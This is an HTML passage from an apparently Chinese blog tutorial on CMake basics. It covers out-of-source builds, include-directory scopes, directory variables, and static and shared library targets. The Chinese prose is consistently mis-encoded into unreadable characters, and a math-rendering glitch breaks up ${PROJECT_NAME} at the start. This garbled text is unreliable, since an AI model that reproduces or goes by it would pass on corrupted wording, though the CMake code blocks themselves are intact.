style=\"margin-right:0.10903em;\">N</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord cjk_fallback\">å˜</span><span class=\"mord cjk_fallback\">é‡</span><span class=\"mord cjk_fallback\">çš„</span><span class=\"mord cjk_fallback\">å€¼</span><span class=\"mord cjk_fallback\">ä¸º</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">æ‰€</span><span class=\"mord cjk_fallback\">ä»¥</span><span class=\"mord cjk_fallback\">æŠŠ</span></span></span></span> {PROJECT_NAME} ç”¨åœ¨ add_executable () é‡Œå¯ä»¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åå­—å« hello_cmake</p>\n<h3 id=\"æ„å»º-ç¼–è¯‘å’Œè¿è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#æ„å»º-ç¼–è¯‘å’Œè¿è¡Œ\">#</a> æ„å»ºã€ç¼–è¯‘å’Œè¿è¡Œ</h3>\n<p>æ„å»ºæœ‰å¤–éƒ¨æ„å»ºå’Œå†…éƒ¨æ„å»ºä¸¤ç§ï¼Œæ¨èä½¿ç”¨å¤–éƒ¨æ„å»ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯ä»¥ä½äºæ–‡ä»¶ç³»ç»Ÿä¸Šä»»ä½•ä½ç½®çš„æ„å»ºæ–‡ä»¶å¤¹ã€‚ æ‰€æœ‰ä¸´æ—¶æ„å»ºå’Œç›®æ ‡æ–‡ä»¶éƒ½ä½äºæ­¤ç›®å½•ä¸­ï¼Œä»¥ä¿æŒæºä»£ç æ ‘çš„æ•´æ´ã€‚</p>\n<p>æ‹¿æœ¬ä¾‹å­æ¥è¯´ï¼š</p>\n<p>è¿è¡Œä¸‹è¿°ä»£ç ï¼Œæ–°å»º build æ„å»ºæ–‡ä»¶å¤¹ï¼Œå¹¶è¿è¡Œ cmake å‘½ä»¤</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> build  æ–°å»ºbuildæ„å»ºæ–‡ä»¶å¤¹</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> build/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cmake <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>è¿™æ—¶å…¶å®å¯ä»¥ç›´æ¥make</pre></td></tr></table></figure><p>æ„å»ºç³»ç»Ÿæ˜¯éœ€è¦æŒ‡å®š CMakeLists.txt æ‰€åœ¨è·¯å¾„ï¼Œæ­¤æ—¶åœ¨ build ç›®å½•ä¸‹ï¼Œæ‰€ä»¥ç”¨  <code>..</code>  è¡¨ç¤º CMakeLists.txt åœ¨ä¸Šä¸€çº§ç›®å½•ã€‚</p>\n<p>æ­¤æ—¶åœ¨ build ç›®å½•ä¸‹ä¼šç”Ÿæˆ Makefile æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨ç¼–è¯‘å™¨æ¥å®é™…ç¼–è¯‘å’Œé“¾æ¥é¡¹ç›®ï¼š</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmake --build .</pre></td></tr></table></figure><p><code>--build</code>  æŒ‡å®šç¼–è¯‘ç”Ÿæˆçš„æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼Œå…¶ä¸­å°±åŒ…æ‹¬å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ <code>.</code>  è¡¨ç¤ºå­˜æ”¾åˆ°å½“å‰ç›®å½•</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230320210319645.png\" alt=\"image-20230320210319645\"></p>\n<p>åŒæ—¶å¦‚æœç‚¹å¼€ build æ–‡ä»¶å¤¹å°±å¯ä»¥çœ‹åˆ°ï¼Œbuild æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº†è®¸å¤šäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚æœè¦ä»å¤´å¼€å§‹é‡æ–°åˆ›å»º cmake ç¯å¢ƒï¼Œåªéœ€åˆ é™¤æ„å»ºç›®å½• buildï¼Œç„¶åé‡æ–°è¿è¡Œ cmakeã€‚ æ‰€ä»¥å¤–éƒ¨æ„å»ºéå¸¸æ–¹ä¾¿</p>\n<h2 id=\"äºŒhello-headers\"><a class=\"markdownIt-Anchor\" href=\"#äºŒhello-headers\">#</a> (äºŒ) hello-headers</h2>\n<h3 id=\"æ–‡ä»¶æ ‘\"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶æ ‘\">#</a> æ–‡ä»¶æ ‘</h3>\n<pre><code class=\"language-tree\">â”œâ”€â”€ CMakeLists.txt\nâ”œâ”€â”€ include\nâ”‚   â””â”€â”€ Hello.h\nâ””â”€â”€ src\n    â”œâ”€â”€ Hello.cpp\n    â””â”€â”€ main.cpp\n</code></pre>\n<h3 id=\"cmakeliststxt-2\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-2\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#æœ€ä½ CMake ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_headers<span class=\"token punctuation\">)</span><span class=\"token comment\"># å·¥ç¨‹å</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token property\">SOURCES</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token comment\">#åˆ›å»ºä¸€ä¸ªå˜é‡ï¼Œåå­—å« SOURCEã€‚å®ƒåŒ…å«äº†æ‰€æœ‰çš„ cpp æ–‡ä»¶ã€‚</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_headers <span class=\"token punctuation\">$&#123;</span><span class=\"token property\">SOURCES</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#ç”¨æ‰€æœ‰çš„æºæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå› ä¸ºè¿™é‡Œå®šä¹‰äº† SOURCE å˜é‡ï¼Œæ‰€ä»¥å°±ä¸éœ€è¦ç½—åˆ— cpp æ–‡ä»¶äº†</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#ç­‰ä»·äºå‘½ä»¤ï¼š     add_executable (hello_headers src/Hello.cpp src/main.cpp)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_headers</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token comment\">#è®¾ç½®è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ hello_headers éœ€è¦åŒ…å«çš„åº“çš„è·¯å¾„</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#PROJECT_SOURCE_DIR æŒ‡å·¥ç¨‹é¡¶å±‚ç›®å½•</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#PROJECT_Binary_DIR æŒ‡ç¼–è¯‘ç›®å½•</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#PRIVATE æŒ‡å®šäº†åº“çš„èŒƒå›´</span></pre></td></tr></table></figure><blockquote>\n<ul>\n<li>PRIVATE - ç›®å½•è¢«æ·»åŠ åˆ°ç›®æ ‡ï¼ˆåº“ï¼‰çš„åŒ…å«è·¯å¾„ä¸­ã€‚</li>\n<li>INTERFACE - ç›®å½•æ²¡æœ‰è¢«æ·»åŠ åˆ°ç›®æ ‡ï¼ˆåº“ï¼‰çš„åŒ…å«è·¯å¾„ä¸­ï¼Œè€Œæ˜¯é“¾æ¥äº†è¿™ä¸ªåº“çš„å…¶ä»–ç›®æ ‡ï¼ˆåº“æˆ–è€…å¯æ‰§è¡Œç¨‹åºï¼‰åŒ…å«è·¯å¾„ä¸­</li>\n<li>PUBLIC - ç›®å½•æ—¢è¢«æ·»åŠ åˆ°ç›®æ ‡ï¼ˆåº“ï¼‰çš„åŒ…å«è·¯å¾„ä¸­ï¼ŒåŒæ—¶æ·»åŠ åˆ°äº†é“¾æ¥äº†è¿™ä¸ªåº“çš„å…¶ä»–ç›®æ ‡ï¼ˆåº“æˆ–è€…å¯æ‰§è¡Œç¨‹åºï¼‰çš„åŒ…å«è·¯å¾„ä¸­</li>\n</ul>\n<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ ¹æ®åº“æ˜¯å¦åŒ…å«è¿™ä¸ªè·¯å¾„ï¼Œä»¥åŠè°ƒç”¨äº†è¿™ä¸ªåº“çš„å…¶ä»–ç›®æ ‡æ˜¯å¦åŒ…å«è¿™ä¸ªè·¯å¾„ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§ scopeã€‚</p>\n</blockquote>\n<h3 id=\"cmakeä¸­çš„å¸¸ç”¨çš„å˜é‡ä¸€äº›ç›®å½•\"><a class=\"markdownIt-Anchor\" href=\"#cmakeä¸­çš„å¸¸ç”¨çš„å˜é‡ä¸€äº›ç›®å½•\">#</a> CMake ä¸­çš„å¸¸ç”¨çš„å˜é‡ (ä¸€äº›ç›®å½•)</h3>\n<p>CMake è¯­æ³•æŒ‡å®šäº†è®¸å¤šå˜é‡ï¼Œå¯ç”¨äºåœ¨é¡¹ç›®æˆ–æºä»£ç æ ‘ä¸­æ‰¾åˆ°æœ‰ç”¨çš„ç›®å½•ã€‚ å…¶ä¸­ä¸€äº›åŒ…æ‹¬ï¼š</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">Variable</th>\n<th style=\"text-align:left\">Info</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">CMAKE_SOURCE_DIR</td>\n<td style=\"text-align:left\">æ ¹æºä»£ç ç›®å½•ï¼Œå·¥ç¨‹é¡¶å±‚ç›®å½•ã€‚æš‚è®¤ä¸ºå°±æ˜¯ PROJECT_SOURCE_DIR</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_CURRENT_SOURCE_DIR</td>\n<td style=\"text-align:left\">å½“å‰å¤„ç†çš„ CMakeLists.txt æ‰€åœ¨çš„è·¯å¾„</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">PROJECT_SOURCE_DIR</td>\n<td style=\"text-align:left\">å·¥ç¨‹é¡¶å±‚ç›®å½•</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_BINARY_DIR</td>\n<td style=\"text-align:left\">è¿è¡Œ cmake çš„ç›®å½•ã€‚å¤–éƒ¨æ„å»ºæ—¶å°±æ˜¯ build ç›®å½•</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_CURRENT_BINARY_DIR</td>\n<td style=\"text-align:left\">The build directory you are currently in. å½“å‰æ‰€åœ¨ build ç›®å½•</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">PROJECT_BINARY_DIR</td>\n<td style=\"text-align:left\">æš‚è®¤ä¸ºå°±æ˜¯ CMAKE_BINARY_DIR</td>\n</tr>\n</tbody>\n</table>\n<p>æƒ³ä½“ä¼šä¸€ä¸‹ï¼Œå¯ä»¥åœ¨ CMakeLists ä¸­ï¼Œåˆ©ç”¨ messageï¼ˆï¼‰å‘½ä»¤è¾“å‡ºä¸€ä¸‹è¿™äº›å˜é‡ã€‚</p>\n<p>å¦å¤–ï¼Œè¿™äº›å˜é‡ä¸ä»…å¯ä»¥åœ¨ CMakeLists ä¸­ä½¿ç”¨ï¼ŒåŒæ ·å¯ä»¥åœ¨æºä»£ç .cpp ä¸­ä½¿ç”¨ã€‚</p>\n<h3 id=\"æºæ–‡ä»¶å˜é‡ä¸å»ºè®®è¿™æ ·åš\"><a class=\"markdownIt-Anchor\" href=\"#æºæ–‡ä»¶å˜é‡ä¸å»ºè®®è¿™æ ·åš\">#</a> æºæ–‡ä»¶å˜é‡ (ä¸å»ºè®®è¿™æ ·åš)</h3>\n<p>å›åˆ°ä»£ç çš„éƒ¨åˆ†ï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªåŒ…å«å¤šä¸ªæºæ–‡ä»¶çš„å˜é‡ SOURCES (ä¸å»ºè®®è¿™æ ·åšï¼Œå¯èƒ½ä¼šå¯¼è‡´ glob å‘½ä»¤åœ¨æ·»åŠ æ–°çš„æºæ–‡ä»¶åä¸ä¼šæ˜¾ç¤ºæ­£ç¡®çš„ç»“æœ)</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token property\">SOURCES</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_NAME</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">$&#123;</span><span class=\"token property\">SOURCES</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"åŒ…å«å¤´æ–‡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#åŒ…å«å¤´æ–‡ä»¶\">#</a> åŒ…å«å¤´æ–‡ä»¶</h3>\n<p>å½“æ‚¨æœ‰å…¶ä»–éœ€è¦åŒ…å«çš„æ–‡ä»¶å¤¹ï¼ˆæ–‡ä»¶å¤¹é‡Œæœ‰å¤´æ–‡ä»¶ï¼‰æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä½¿ç¼–è¯‘å™¨çŸ¥é“å®ƒä»¬ï¼š target_include_directoriesï¼ˆï¼‰ã€‚ ç¼–è¯‘æ­¤ç›®æ ‡æ—¶ï¼Œè¿™å°†ä½¿ç”¨ - I æ ‡å¿—å°†è¿™äº›ç›®å½•æ·»åŠ åˆ°ç¼–è¯‘å™¨ä¸­ï¼Œä¾‹å¦‚ -I / ç›®å½• / è·¯å¾„</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>target</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>PRIVATE  æ ‡è¯†ç¬¦æŒ‡å®šåŒ…å«çš„èŒƒå›´ã€‚ è¿™å¯¹åº“å¾ˆé‡è¦ã€‚</p>\n</blockquote>\n<p><strong>å¯¹äºå…¬å…±çš„å¤´æ–‡ä»¶ï¼Œæœ€å¥½åœ¨ include æ–‡ä»¶å¤¹ä¸‹å»ºç«‹å­ç›®å½•ã€‚</strong></p>\n<p><strong>ä¼ é€’ç»™å‡½æ•° target_include_directories () çš„ç›®å½•ï¼Œåº”è¯¥æ˜¯æ‰€æœ‰åŒ…å«ç›®å½•çš„æ ¹ç›®å½•ï¼Œç„¶ååœ¨è¿™ä¸ªæ ¹ç›®å½•ä¸‹å»ºç«‹ä¸åŒçš„æ–‡ä»¶å¤¹ï¼Œåˆ†åˆ«å†™å¤´æ–‡ä»¶ã€‚</strong></p>\n<p><strong>è¿™æ ·ä½¿ç”¨çš„æ—¶å€™ï¼Œä¸éœ€è¦å†™ ${PROJECT_SOURCE_DIR}/includeï¼Œè€Œæ˜¯ç›´æ¥é€‰æ‹©å¯¹åº”çš„æ–‡ä»¶å¤¹é‡Œå¯¹åº”å¤´æ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¾‹å­ï¼š <code>#include &quot;static/Hello.h&quot;</code>  è€Œä¸æ˜¯ <code>#include &quot;Hello.h&quot;</code>  ä½¿ç”¨æ­¤æ–¹æ³•æ„å‘³ç€åœ¨é¡¹ç›®ä¸­ä½¿ç”¨å¤šä¸ªåº“æ—¶ï¼Œå¤´æ–‡ä»¶åå†²çªçš„å¯èƒ½æ€§è¾ƒå°ã€‚</strong></p>\n<h2 id=\"ä¸‰static-library\"><a class=\"markdownIt-Anchor\" href=\"#ä¸‰static-library\">#</a> ï¼ˆä¸‰ï¼‰Static Library</h2>\n<h3 id=\"cmakeliststxt-3\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-3\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span><span class=\"token punctuation\">(</span>hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Create a library</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#åº“çš„æºæ–‡ä»¶ Hello.cpp ç”Ÿæˆé™æ€åº“ hello_library</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">STATIC</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_library</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token namespace\">PUBLIC</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># target_include_directories ä¸ºä¸€ä¸ªç›®æ ‡ï¼ˆå¯èƒ½æ˜¯ä¸€ä¸ªåº“ library ä¹Ÿå¯èƒ½æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æ·»åŠ å¤´æ–‡ä»¶è·¯å¾„ã€‚</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># Create an executable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Add an executable with the above sources</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#æŒ‡å®šç”¨å“ªä¸ªæºæ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶å’Œé™æ€åº“</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        hello_library</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#é“¾æ¥åº“å’ŒåŒ…å«å¤´æ–‡ä»¶éƒ½æœ‰å…³äº scope è¿™ä¸‰ä¸ªå…³é”®å­—çš„ç”¨æ³•ã€‚</span></pre></td></tr></table></figure><h4 id=\"åˆ›å»ºé™æ€åº“\"><a class=\"markdownIt-Anchor\" href=\"#åˆ›å»ºé™æ€åº“\">#</a> åˆ›å»ºé™æ€åº“</h4>\n<p>add_libraryï¼ˆï¼‰å‡½æ•°ç”¨äºä»æŸäº›æºæ–‡ä»¶åˆ›å»ºä¸€ä¸ªåº“ï¼Œé»˜è®¤ç”Ÿæˆåœ¨æ„å»ºæ–‡ä»¶å¤¹ã€‚ å†™æ³•å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">STATIC</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>åœ¨ add_library è°ƒç”¨ä¸­åŒ…å«äº†æºæ–‡ä»¶ï¼Œç”¨äºåˆ›å»ºåç§°ä¸º libhello_library.a çš„é™æ€åº“ã€‚</p>\n<h3 id=\"é“¾æ¥åº“\"><a class=\"markdownIt-Anchor\" href=\"#é“¾æ¥åº“\">#</a> é“¾æ¥åº“</h3>\n<p>åˆ›å»ºå°†ä½¿ç”¨è¿™ä¸ªåº“çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå¿…é¡»å‘ŠçŸ¥ç¼–è¯‘å™¨éœ€è¦ç”¨åˆ°è¿™ä¸ªåº“ã€‚ å¯ä»¥ä½¿ç”¨ target_link_libraryï¼ˆï¼‰å‡½æ•°å®Œæˆæ­¤æ“ä½œã€‚add_executable () è¿æ¥æºæ–‡ä»¶ï¼Œtarget_link_libraries () è¿æ¥åº“æ–‡ä»¶ã€‚</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        hello_library</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¿™å‘Šè¯‰ CMake åœ¨é“¾æ¥æœŸé—´å°† hello_library é“¾æ¥åˆ° hello_binary å¯æ‰§è¡Œæ–‡ä»¶ã€‚ åŒæ—¶ï¼Œè¿™ä¸ªè¢«é“¾æ¥çš„åº“å¦‚æœæœ‰ INTERFACE æˆ–è€… PUBLIC å±æ€§çš„åŒ…å«ç›®å½•ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªåŒ…å«ç›®å½•ä¹Ÿä¼šè¢«ä¼ é€’ï¼ˆ propagate ï¼‰ç»™è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>\n<h2 id=\"å››shared-library\"><a class=\"markdownIt-Anchor\" href=\"#å››shared-library\">#</a> ï¼ˆå››ï¼‰Shared Library</h2>\n<h3 id=\"cmakeliststxt-4\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-4\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span><span class=\"token punctuation\">(</span>hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Create a library</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#æ ¹æ® Hello.cpp ç”ŸæˆåŠ¨æ€åº“</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">SHARED</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#ç»™åŠ¨æ€åº“ hello_library èµ·ä¸€ä¸ªåˆ«çš„åå­— hello::library</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span><span class=\"token inserted class-name\">hello::library</span> ALIAS hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#ä¸ºè¿™ä¸ªåº“ç›®æ ‡ï¼Œæ·»åŠ å¤´æ–‡ä»¶è·¯å¾„ï¼ŒPUBLIC è¡¨ç¤ºåŒ…å«äº†è¿™ä¸ªåº“çš„ç›®æ ‡ä¹Ÿä¼šåŒ…å«è¿™ä¸ªè·¯å¾„</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_library</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token namespace\">PUBLIC</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token 